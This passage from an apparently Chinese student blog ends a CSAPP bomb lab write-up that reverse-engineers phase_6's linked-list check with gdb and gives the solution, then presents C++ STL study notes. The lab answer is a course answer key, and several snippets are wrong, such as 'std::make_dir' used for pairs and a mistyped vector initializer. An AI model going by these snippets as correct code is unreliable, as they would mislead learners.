<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40116f:       be 00 00 00 00          mov    $0x0,%esi # 计数器</span><br><span class="line">401174:       eb 21                   jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line">401176:       48 8b 52 08             mov    0x8(%rdx),%rdx # 这里应该是把结构体的指针域放入到rdx</span><br><span class="line">40117a:       83 c0 01                add    $0x1,%eax</span><br><span class="line">40117d:       39 c8                   cmp    %ecx,%eax</span><br><span class="line">40117f:       75 f5                   jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">401181:       eb 05                   jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">401183:       ba d0 32 60 00          mov    $0x6032d0,%edx # 又是那个奇怪的地址，赋给edx</span><br><span class="line">401188:       48 89 54 74 20          mov    %rdx,0x20(%rsp,%rsi,2) # 把这个地址的东西加到栈上</span><br><span class="line">40118d:       48 83 c6 04             add    $0x4,%rsi # 更新计数器</span><br><span class="line">401191:       48 83 fe 18             cmp    $0x18,%rsi # 看看是否到了六个数</span><br><span class="line">401195:       74 14                   je     4011ab &lt;phase_6+0xb7&gt; # 是的话就跳走</span><br><span class="line">401197:       8b 0c 34                mov    (%rsp,%rsi,1),%ecx # 依次获取六个数</span><br><span class="line">40119a:       83 f9 01                cmp    $0x1,%ecx # 比较是否小于等于1</span><br><span class="line">40119d:       7e e4                   jle    401183 &lt;phase_6+0x8f&gt; # 是的话就调到上面</span><br><span class="line">40119f:       b8 01 00 00 00          mov    $0x1,%eax # 否则eax=1</span><br><span class="line">4011a4:       ba d0 32 60 00          mov    $0x6032d0,%edx # 把一个奇怪的地址赋给了edx</span><br><span class="line">4011a9:       eb cb                   jmp    401176 &lt;phase_6+0x82&gt; # 跳到上面</span><br></pre></td></tr></table></figure>
<p>​    这一部分可以说是整个lab里面最让人费解的地方了。</p>
<p>​    根据之前的经验，似乎可以先看看<code>0x6032d0</code>里面的东西，但是实际查看之后发现里面的内容也是难以解析的。后来在网上参考了别人的解法，发现这里其实是一个链表。</p>
<p>​    用gdb打印一下这个地址以及附近的值的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/24w 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:       0x0000014c      0x00000001      0x006032e0      0x00000000</span><br><span class="line">0x6032e0 &lt;node2&gt;:       0x000000a8      0x00000002      0x006032f0      0x00000000</span><br><span class="line">0x6032f0 &lt;node3&gt;:       0x0000039c      0x00000003      0x00603300      0x00000000</span><br><span class="line">0x603300 &lt;node4&gt;:       0x000002b3      0x00000004      0x00603310      0x00000000</span><br><span class="line">0x603310 &lt;node5&gt;:       0x000001dd      0x00000005      0x00603320      0x00000000</span><br><span class="line">0x603320 &lt;node6&gt;:       0x000001bb      0x00000006      0x00000000      0x00000000</span><br></pre></td></tr></table></figure>
<p>​    由于最开始输入的六个数就是123456，所以第二列应该就是输入的值，第三列其实就是下一个结点的地址，那这很清晰就是一个链表的结构了。此外由于每两个结点地址刚好差一个十进制的16，根据结构体的存储方式，可以认为每个结点存了两个<code>int</code>型的数据和一个指针。至于另外一个<code>int</code>型的数据是什么暂时还不清楚。</p>
<p>​    现在知道了这个内存里是个什么东西，也就返回去再猜测一下上面那一部分代码的作用。</p>
<p>​    这里的大概作用就是把指针域也存放到栈上，存在<code>rsp+20-rsp+50</code>这个区域里。</p>
<p>​    然后再看下一部分。目前还有的疑问就是结构体中另外一个<code>int</code>到底是什么。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4011ab:       48 8b 5c 24 20          mov    0x20(%rsp),%rbx # 取出第一个指针，给rbx rbx=head;</span><br><span class="line">4011b0:       48 8d 44 24 28          lea    0x28(%rsp),%rax # 把第二个指针给rax rax=rbx-&gt;next;</span><br><span class="line">4011b5:       48 8d 74 24 50          lea    0x50(%rsp),%rsi # 作为终止记号 rsi=tail;</span><br><span class="line">4011ba:       48 89 d9                mov    %rbx,%rcx # 第一个指针给rcx rcx=rbx;</span><br><span class="line">4011bd:       48 8b 10                mov    (%rax),%rdx # 第二个指针指向的值给rdx rdx=rax-&gt;value;</span><br><span class="line">4011c0:       48 89 51 08             mov    %rdx,0x8(%rcx) # 把这个值再给rcx的指针域 rcx-&gt;next-&gt;value=rax-&gt;value;</span><br><span class="line">4011c4:       48 83 c0 08             add    $0x8,%rax # 指向下一个指针 rax=rax-&gt;next;</span><br><span class="line">4011c8:       48 39 f0                cmp    %rsi,%rax # 到了结尾就终止循环 </span><br><span class="line">4011cb:       74 05                   je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">4011cd:       48 89 d1                mov    %rdx,%rcx # rcx-&gt;value=rax-&gt;value</span><br><span class="line">4011d0:       eb eb                   jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">4011d2:       48 c7 42 08 00 00 00    movq   $0x0,0x8(%rdx)</span><br><span class="line">4011d9:       00</span><br></pre></td></tr></table></figure>
<p>​    感觉这个循环写的就怪怪的，里面有一些怪怪的赋值。直接在这一部分结束的时候打断点看结果吧。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/24w 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:       0x0000014c      0x00000001      0x00000000      0x00000000          </span><br><span class="line">0x6032e0 &lt;node2&gt;:       0x000000a8      0x00000002      0x006032d0      0x00000000   </span><br><span class="line">0x6032f0 &lt;node3&gt;:       0x0000039c      0x00000003      0x006032e0      0x00000000</span><br><span class="line">0x603300 &lt;node4&gt;:       0x000002b3      0x00000004      0x006032f0      0x00000000</span><br><span class="line">0x603310 &lt;node5&gt;:       0x000001dd      0x00000005      0x00603300      0x00000000             </span><br><span class="line">0x603320 &lt;node6&gt;:       0x000001bb      0x00000006      0x00603310      0x00000000</span><br></pre></td></tr></table></figure>
<p>​    目测这一阶段的内容大概是翻转链表，那么接下来我们看看最后一部分的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4011da:       bd 05 00 00 00          mov    $0x5,%ebp   # 大概也是一个计数器           </span><br><span class="line">4011df:       48 8b 43 08             mov    0x8(%rbx),%rax   # rax=rbx-&gt;next</span><br><span class="line">4011e3:       8b 00                   mov    (%rax),%eax    # eax=rax-&gt;value </span><br><span class="line">4011e5:       39 03                   cmp    %eax,(%rbx)    # 比较eax和rbx指向的值，注意这里的eax只有结构体的第一个数字。</span><br><span class="line">4011e7:       7d 05                   jge    4011ee &lt;phase_6+0xfa&gt;    # 大了就爆炸</span><br><span class="line">4011e9:       e8 4c 02 00 00          callq  40143a &lt;explode_bomb&gt;     </span><br><span class="line">4011ee:       48 8b 5b 08             mov    0x8(%rbx),%rbx    # rbx=rbx-&gt;next      </span><br><span class="line">4011f2:       83 ed 01                sub    $0x1,%ebp       # 更新计数器      </span><br><span class="line">4011f5:       75 e8                   jne    4011df &lt;phase_6+0xeb&gt;      </span><br><span class="line">4011f7:       48 83 c4 50             add    $0x50,%rsp               </span><br><span class="line">4011fb:       5b                      pop    %rbx           </span><br><span class="line">4011fc:       5d                      pop    %rbp            </span><br><span class="line">4011fd:       41 5c                   pop    %r12          </span><br><span class="line">4011ff:       41 5d                   pop    %r13      </span><br><span class="line">401201:       41 5e                   pop    %r14  </span><br><span class="line">401203:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>​    看上面的代码，打印一下<code>rbx</code>的值。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144344939.png" alt="image-20220326144344939"></p>
<p>​    <code>rbx</code>里面存的其实就是头指针，然后再结合对<code>eax</code>的赋值和后续的比较，可以断定结构体中的第一个数其实就是要比较的内容！</p>
<p>​    然后看一下这里的比较方法，就是说将当前指针指向的值和下一个指针指向的值作比较，如果小了的话就会爆炸。那么咱们就是要确定这个链表的顺序了，它最终应该是按照第一个值降序排列的。然后多试几组数据就会发现，咱们输入的值实际上就是链表的序号，那么看一下对应的第一个值的大小。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144452358.png" alt="image-20220326144452358"></p>
<p>​    根据大小排列的话，正确的结果应该是3 4 5 6 1 2，不过因为最开始对7取了余，所以最终应该是4 3 2 1 6 5</p>
<p>​    真不容易啊。。。</p>
<h1 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h1><p>​    这个先等等吧。。。。<code>phase_6</code>已经够晕乎的了。。大概过段时间会把<code>phase_6</code>和这个再做一遍。</p>
]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>C++学习（一）</title>
    <url>/2021/11/30/C-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    首先这段时间一直比较忙，自从上次更新到现在大概过了一个多月，期间准备了大学生数学竞赛，同时参与了阿里的miniob比赛，后者基本上就是抱着竞赛驱动学习的想法去的，<del>其实是自己太菜，拿不了奖</del>，也算是初步接触了一下数据库和编译的一些知识，另外由于oceanbase是用C++实现的，也算是对阅读大项目源码有了一点认知，过段时间或许会写一下参赛总结，复盘一下这学期我都做了些什么，以及未来一段时间的打算，不过我会先把之前那个写了一半的flex&amp;bison写完:joy:</p>
<p>​    另外就是这学期选了马光志老师的C++程序设计语言，虽然这门课基本上学的都是C++的精髓，即面向对象编程的这种思想，但是感觉目前是用不上的。目前在准备这周末的csp考试，这里就简单总结一下刷题的时候用到的stl的一些东西，先把C++当成带stl的C来用吧:joy:</p>
<h1 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h1><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p>​    首先需要介绍的就是algoirthm类里的快速排序，函数原型如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span> <span class="params">(RandomAccessIterator first, RandomAccessIterator last, Compare comp)</span></span>;</span><br></pre></td></tr></table></figure>
<p>​    第一个和第二个参数分别是起始地址和终止地址，第三个参数可以自定义排序方法，也可以省略，这个时候按默认从小到大排序，下面看两个例子。</p>
<p>​    第一个例子，缺省第三个参数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"> <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="comment">//sort函数第三个参数采用默认从小到大</span></span><br><span class="line"> 　   <span class="keyword">int</span> a[]=&#123;<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>&#125;;</span><br><span class="line"> 　　 <span class="built_in">sort</span>(a,a+<span class="number">5</span>);</span><br><span class="line"> 　　　<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line"> 　　　 　　cout&lt;&lt;a[i]&lt;&lt;<span class="string">&quot; &quot;</span>;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​    这里输出的就是从小到大排序后的数组。</p>
<p>​    第二个例子，自定义排序方法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">　　<span class="comment">//sort函数第三个参数自己定义，实现从大到小 </span></span><br><span class="line">　　　　<span class="keyword">int</span> a[]=&#123;<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>&#125;;</span><br><span class="line">　　　　　　<span class="built_in">sort</span>(a,a+<span class="number">5</span>,cmp);</span><br><span class="line">　　　　　　　<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">　　　　　　　　　cout&lt;&lt;a[i]&lt;&lt;<span class="string">&quot; &quot;</span>;     </span><br><span class="line">&#125;</span><br><span class="line">　　　　　　　　　<span class="comment">//自定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">　　　<span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="unique"><a href="#unique" class="headerlink" title="unique"></a>unique</h2><p>​    unique函数也是定义在algorithm中的一个函数，它的作用是把容器中重复的元素放到容器末尾，最后返回容器尾地址，使用前需要对容器进行排序，如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">8</span>] = &#123;<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    std::<span class="built_in">sort</span>(a, a + <span class="number">8</span>);  <span class="comment">//对于无序的数组需要先排序</span></span><br><span class="line">    c = (std::<span class="built_in">unique</span>(a, a + <span class="number">8</span>) - a );</span><br><span class="line">    std::cout&lt;&lt; <span class="string">&quot;c = &quot;</span> &lt;&lt; c &lt;&lt; std::endl;<span class="comment">//去重函数返回地址为：去重后最后一个不重复元素地址</span></span><br><span class="line">    <span class="comment">//打印去重后的数组成员</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; c; i++)</span><br><span class="line">        std::cout&lt;&lt; <span class="string">&quot;a = [&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] = &quot;</span> &lt;&lt; a[i] &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    如果要对结构体进行操作，需要对<strong>==</strong>进行重载</p>
<h2 id="next-permutation"><a href="#next-permutation" class="headerlink" title="next_permutation()"></a>next_permutation()</h2><p>​    该函数用来给出一个序列在全排列中的下一个序列，在已达到最后一个序列的时候会返回false</p>
<h1 id="String"><a href="#String" class="headerlink" title="String"></a>String</h1><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>​    string类有多个构造函数，如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">string <span class="title">s1</span><span class="params">()</span></span>;<span class="comment">//默认构造空串</span></span><br><span class="line"><span class="function">string <span class="title">s2</span><span class="params">(<span class="string">&quot;hello&quot;</span>)</span></span>;<span class="comment">//s2=&quot;hello&quot;</span></span><br><span class="line"><span class="function">string <span class="title">s3</span><span class="params">(<span class="number">4</span>,<span class="string">&#x27;Y&#x27;</span>)</span></span>;<span class="comment">//s3=&quot;YYYY&quot;</span></span><br><span class="line"><span class="function">string <span class="title">s4</span><span class="params">(<span class="string">&quot;12345&quot;</span>,<span class="number">1</span>,<span class="number">3</span>)</span></span>;<span class="comment">//s4=&quot;234&quot;，即取子串，第二个参数是起点，第三个参数是长度</span></span><br></pre></td></tr></table></figure>
<h2 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h2><p>​    可以用char<em>类型的常量或变量以及char类型的变量、常量对string对象进行赋值，也可以用<em>*assign</em></em>成员函数对其赋值，返回对象自身的引用，如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s1,s2,s3;</span><br><span class="line">s1=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">s2=<span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">s3.<span class="built_in">assign</span>(s1);<span class="comment">//s3=s1</span></span><br><span class="line">s2.<span class="built_in">assign</span>(s1,<span class="number">1</span>,<span class="number">2</span>);<span class="comment">//s2=&quot;el&quot;;</span></span><br><span class="line">s2.<span class="built_in">assign</span>(<span class="number">4</span>,<span class="string">&#x27;k&#x27;</span>);<span class="comment">//s2=&#x27;KKKK&#x27;;</span></span><br><span class="line">s2.<span class="built_in">assign</span>(<span class="string">&quot;12345&quot;</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="取长度"><a href="#取长度" class="headerlink" title="取长度"></a>取长度</h3><p>​    可以用<strong>length()</strong>函数或<strong>size()</strong>函数</p>
<h3 id="连接字符串"><a href="#连接字符串" class="headerlink" title="连接字符串"></a>连接字符串</h3><p>​    可以直接用<strong>=</strong>或<strong>+=</strong>来进行操作，也可以用<strong>append()</strong>成员函数在字符串后面添加内容，返回对象自身的引用，如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">string <span class="title">s1</span><span class="params">(<span class="string">&quot;123&quot;</span>)</span>,<span class="title">s2</span><span class="params">(<span class="string">&quot;456&quot;</span>)</span></span>;</span><br><span class="line">s1.<span class="built_in">append</span>(s2);<span class="comment">//s1=&quot;123456&quot;;</span></span><br><span class="line"><span class="comment">//另外就是上面的assign的各种使用方法在这里都是有的</span></span><br></pre></td></tr></table></figure>
<h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><p>​    可以使用正常的运算符进行比较，也可以使用<strong>compare()</strong>成员函数，返回值小于0表示当前字符串小，等于0表示两个字符串相等，大于0表示另外一个字符串小</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">string <span class="title">s1</span><span class="params">(<span class="string">&quot;hello&quot;</span>)</span>, <span class="title">s2</span><span class="params">(<span class="string">&quot;hello, world&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">int</span> n = s1.<span class="built_in">compare</span>(s2);</span><br><span class="line">n = s1.<span class="built_in">compare</span>(<span class="number">1</span>, <span class="number">2</span>, s2, <span class="number">0</span>, <span class="number">3</span>);  <span class="comment">//比较s1的子串 (1,2) 和s2的子串 (0,3)</span></span><br><span class="line">n = s1.<span class="built_in">compare</span>(<span class="number">0</span>, <span class="number">2</span>, s2);  <span class="comment">// 比较s1的子串 (0,2) 和 s2</span></span><br><span class="line">n = s1.<span class="built_in">compare</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">n = s1.<span class="built_in">compare</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;Hello&quot;</span>);  <span class="comment">//比较 s1 的子串(1,2)和&quot;Hello&quot;</span></span><br><span class="line">n = s1.<span class="built_in">compare</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;Hello&quot;</span>, <span class="number">1</span>, <span class="number">2</span>);  <span class="comment">//比较 s1 的子串(1,2)和 &quot;Hello&quot; 的子串(1,2)</span></span><br></pre></td></tr></table></figure>
<h3 id="求子串"><a href="#求子串" class="headerlink" title="求子串"></a>求子串</h3><p>​    可以使用成员函数<strong>substr()</strong>获取子串，原型如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">string <span class="title">substr</span><span class="params">(<span class="keyword">int</span> n = <span class="number">0</span>, <span class="keyword">int</span> m = string::npos)</span> <span class="keyword">const</span></span>;</span><br></pre></td></tr></table></figure>
<p>​    如果省略第二个参数m或者m超过字符串长度，那么求出来的子串就是从当前下标开始一直到结束的串</p>
<h3 id="交换内容"><a href="#交换内容" class="headerlink" title="交换内容"></a>交换内容</h3><p>​    直接使用成员函数<strong>swap()</strong>即可，即s1.swap(s2)</p>
<h3 id="查找子串和字符"><a href="#查找子串和字符" class="headerlink" title="查找子串和字符"></a>查找子串和字符</h3><p>​    这块的函数很多，返回值都是下标，查不到就返回<strong>string::npos</strong>，常用的有如下几个：</p>
<ol>
<li>find()，从前往后查找，rfind()，从后往前查找</li>
<li>find_first_of()，参数是一个串，假如是”abc”，那么该函数查找当前串中第一次出现”abc”中任一字符的位置，find_last_of()同理。</li>
<li>find_first_not_of()和find_last_not_of()同上。</li>
</ol>
<h3 id="替换和删除"><a href="#替换和删除" class="headerlink" title="替换和删除"></a>替换和删除</h3><p>​    用<strong>replace()</strong>成员函数进行替换，返回值为自身引用，用<strong>erase()</strong>成员函数删除子串，返回值为对象自身的引用</p>
<h3 id="插入字符串"><a href="#插入字符串" class="headerlink" title="插入字符串"></a>插入字符串</h3><p>​    用<strong>insert()</strong>，见下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">string <span class="title">s1</span><span class="params">(<span class="string">&quot;Limitless&quot;</span>)</span>, <span class="title">s2</span><span class="params">(<span class="string">&quot;00&quot;</span>)</span></span>;</span><br><span class="line">s1.<span class="built_in">insert</span>(<span class="number">2</span>, <span class="string">&quot;123&quot;</span>);  <span class="comment">//在下标 2 处插入字符串&quot;123&quot;，s1 = &quot;Li123mitless&quot;</span></span><br><span class="line">s1.<span class="built_in">insert</span>(<span class="number">3</span>, s2);  <span class="comment">//在下标 2 处插入 s2 , s1 = &quot;Li10023mitless&quot;</span></span><br><span class="line">s1.<span class="built_in">insert</span>(<span class="number">3</span>, <span class="number">5</span>, <span class="string">&#x27;X&#x27;</span>);  <span class="comment">//在下标 3 处插入 5 个 &#x27;X&#x27;，s1 = &quot;Li1XXXXX0023mitless&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="作为流处理"><a href="#作为流处理" class="headerlink" title="作为流处理"></a>作为流处理</h2><p>​    需要包含头文件<strong>sstream</strong></p>
<p>​    用<strong>istringstream</strong>和<strong>ostringstream</strong>作为输入输出，用法和cin与cout对应</p>
<h2 id="与数值类型的转换"><a href="#与数值类型的转换" class="headerlink" title="与数值类型的转换"></a>与数值类型的转换</h2><p>​    可以用sscanf函数，比如有一个String类型的值s，形如”1+2i”，要取出这个复数的实部和虚部，可以用如下方法。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sscanf</span>(s.<span class="built_in">c_str</span>(),<span class="string">&quot;%d+%di&quot;</span>,&amp;a,&amp;b);</span><br></pre></td></tr></table></figure>
<p>​    而要将数值类型转换成string类型，可以使用<strong>to_string()</strong>函数</p>
<h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>​    感觉迭代器是个类似于指针的东西，由于容器遍历时很多地方都用到了迭代器，所以这里先简单介绍一下，以vector为例，其实其他的都是一样的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="keyword">int</span>&gt;::iterator it;<span class="comment">//这就算定义了一个迭代器</span></span><br><span class="line"><span class="keyword">for</span>(it=vec.<span class="built_in">begin</span>();it!=vec.<span class="built_in">end</span>();it++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//begin和end函数分别取vector的首地址和尾地址的下一个地址，大概是一种左闭右开的区间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="pair"><a href="#pair" class="headerlink" title="pair"></a>pair</h2><p>​    <strong>pair不是容器</strong>，是一个结构模板，但是感觉功能上和vector、map差不多，就一起放在这里了。</p>
<p>​    pair是将两个数据合成一个，主要成员变量为first和second，在头文件utility中，定义如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T1</span>,<span class="keyword">class</span> <span class="title">T2</span>&gt;</span> <span class="class"><span class="keyword">struct</span> <span class="title">pair</span></span></span><br></pre></td></tr></table></figure>
<p>​    参数为两个数据的类型。</p>
<p>​    创建pair对象时<strong>必须提供两个类型</strong>，并且<strong>不必相同</strong>，可以在定义的时候进行初始化，见下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">pair&lt;string, string&gt; anon;        <span class="comment">// 创建一个空对象anon，两个元素类型都是string</span></span><br><span class="line"><span class="function">pair&lt;string, <span class="keyword">int</span>&gt; <span class="title">word_count</span><span class="params">(<span class="string">&quot;hello&quot;</span>,<span class="number">5</span>)</span></span>;     <span class="comment">// 创建一个空对象 word_count, 两个元素类型分别是string和int类型</span></span><br></pre></td></tr></table></figure>
<p>​    下面是pair的一些相关操作</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">pair&lt;<span class="keyword">int</span> ,<span class="keyword">double</span>&gt; p1;</span><br><span class="line">p1.first = <span class="number">1</span>,p1.second = <span class="number">2.5</span>;<span class="comment">//通过这样访问成员</span></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;string,string&gt; Author;<span class="comment">//因为每次定义一个新的非常繁琐，所以一般会用typedef</span></span><br><span class="line">Author lry=std::<span class="built_in">make_dir</span>(<span class="string">&quot;nb&quot;</span>,<span class="string">&quot;nb&quot;</span>); <span class="comment">//可以用make_dir构造一个新的pair</span></span><br><span class="line">std::string s1,s2;</span><br><span class="line">std::<span class="built_in">tie</span>(s1,s2)=<span class="built_in">getau</span>();<span class="comment">//在某些清况函数会以pair对象作为返回值时，可以直接通过std::tie进行接收</span></span><br><span class="line"><span class="function">Author <span class="title">getau</span><span class="params">(String s1,String s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> std::<span class="built_in">make_dir</span>(s1,s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    另外了解pair的一个契机是在刷csp的题的时候，我用我自定义的结构体和cmp函数进行排序超时，然后在网上看别人的写法，发现用pair不会超时，要用sort对pair数组进行排序的话，可以缺省cmp，剩下的和结构体排序完全一样。</p>
<p>​    关于为什么那道题会TLE，最开始去看了sort的源码，发现缺省第三个参数的时候会默认使用inline constexpr operator &lt;这样一个内联重载，而在C++课上了解到，这两种方法是可以提升性能的，于是去改了我的代码，但是仍然过不了…..</p>
<p>​    <strong><em>在这里也算是复习一下这两个知识</em></strong></p>
<ol>
<li>对于inline，我们知道，在函数调用时，要先在栈上为形参和局部变量分配空间，然后将实参值复制给形参，再将函数返回地址放入栈，而再return后这样一个过程会倒着来一遍，这样就会造成一定的时间消耗，我们在定义函数的时候可以使用关键字<strong>inline</strong>来修饰，<strong>当编译器处理调用内联函数的语句时，不会将该语句编译成函数调用的指令，而是直接将整个函数体的代码插入调用语句处，就像整个函数体在调用处被重写了一遍一样。</strong>其实还是一个典型的用空间换时间的做法，下面是要注意的几点：<ol>
<li>一般只是将那种只有几条指令的函数作为内联函数。</li>
<li>在调用内联函数前必须出现内联函数的定义。</li>
</ol>
</li>
<li>对于constexpr，它可以用来修饰变量、构造函数、函数，要求函数的返回值和参数必须是字面值，有两个主要作用，一是让编译器在编译期对表达式进行一定的优化，例如计算值之类的，二是如果传进来的不是字面值，不会报错，而是会在程序运行的时候进行计算。</li>
</ol>
<h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><p>​    在头文件vector中定义，优点感觉主要就是可以自己动态调整。</p>
<p>​    声明和初始化有以下几个方法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="keyword">int</span>&gt; a ;                                <span class="comment">//声明一个int型向量a</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">10</span>)</span> </span>;                            <span class="comment">//声明一个初始大小为10的向量</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">10</span>, <span class="number">1</span>)</span> </span>;                         <span class="comment">//声明一个初始大小为10且初始值都为1的向量</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">b</span><span class="params">(a)</span> </span>;                             <span class="comment">//声明并用向量a初始化向量b</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">b</span><span class="params">(a.begin(), a.begin()+<span class="number">3</span>)</span> </span>;        <span class="comment">//将a向量中从第0个到第2个(共3个)作为向量b的初始值</span></span><br><span class="line"><span class="comment">//也可以直接用数组对它初始化</span></span><br><span class="line"><span class="keyword">int</span> n[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(n,n+<span class="number">5</span>)</span></span>;</span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(&amp;n[<span class="number">1</span>],&amp;a[<span class="number">4</span>])</span></span>;</span><br></pre></td></tr></table></figure>
<p>​    可以用类似于数组的方法对他进行访问，也可以使用迭代器。</p>
